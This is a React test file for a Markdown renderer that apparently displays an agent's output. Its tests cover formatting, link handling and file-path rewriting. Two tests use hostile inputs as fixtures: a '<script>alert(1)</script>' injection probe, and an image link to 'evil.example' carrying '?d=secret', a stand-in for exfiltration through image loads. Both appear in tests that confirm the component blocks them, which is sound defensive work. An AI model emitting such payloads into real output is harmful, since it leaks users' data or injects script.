import { render, screen } from '@testing-library/react';
import { Markdown } from './Markdown';

describe('Markdown', () => {
	it('renders headings, emphasis, lists, code and tables', () => {
		const { container } = render(
			<Markdown
				text={[
					'## Plan',
					'',
					'I **located** the links in `src/app.ts`.',
					'',
					'- first',
					'- second',
					'',
					'```ts',
					'const x = 1;',
					'```',
					'',
					'| a | b |',
					'| - | - |',
					'| 1 | 2 |',
				].join('\n')}
			/>
		);
		expect(screen.getByRole('heading', { level: 2, name: 'Plan' })).toBeInTheDocument();
		expect(screen.getByText('located').tagName).toBe('STRONG');
		expect(screen.getByText('src/app.ts').tagName).toBe('CODE');
		expect(screen.getAllByRole('listitem').map((li) => li.textContent)).toEqual([
			'first',
			'second',
		]);
		expect(container.querySelector('pre code')).toHaveTextContent('const x = 1;');
		expect(screen.getByRole('table')).toBeInTheDocument();
	});

	it('opens links in a new tab and never renders raw HTML', () => {
		const { container } = render(
			<Markdown text={'See [docs](https://example.com) <script>alert(1)</script>'} />
		);
		const link = screen.getByRole('link', { name: 'docs' });
		expect(link).toHaveAttribute('target', '_blank');
		expect(link).toHaveAttribute('rel', 'noreferrer');
		expect(container.querySelector('script')).toBeNull();
	});

	it('points file links and images at the file route when given the agent folder', () => {
		render(
			<Markdown
				cwd="/Users/me/projects/shop"
				text={
					'[out](../x/out.html) [web](https://e.com) [raw](file:///Users/me/a.txt) ![shot](shots/a.png)'
				}
			/>
		);
		expect(screen.getByRole('link', { name: 'out' })).toHaveAttribute(
			'href',
			'/api/files/Users/me/projects/x/out.html'
		);
		expect(screen.getByRole('link', { name: 'web' })).toHaveAttribute('href', 'https://e.com');
		expect(screen.getByRole('link', { name: 'raw' })).toHaveAttribute(
			'href',
			'/api/files/Users/me/a.txt'
		);
		expect(screen.getByRole('img', { name: 'shot' })).toHaveAttribute(
			'src',
			'/api/files/Users/me/projects/shop/shots/a.png'
		);
	});

	it('never loads a picture from another site, and offers it as a link instead', () => {
		const { container } = render(
			<Markdown
				cwd="/Users/me/projects/shop"
				text={'![chart](https://evil.example/p.png?d=secret)'}
			/>
		);
		expect(container.querySelector('img')).toBeNull();
		expect(screen.getByRole('link', { name: /chart/ })).toHaveAttribute(
			'href',
			'https://evil.example/p.png?d=secret'
		);
	});

	it('leaves file links as written without a folder to resolve them against', () => {
		render(<Markdown text={'[out](../x/out.html)'} />);
		expect(screen.getByRole('link', { name: 'out' })).toHaveAttribute('href', '../x/out.html');
	});
});
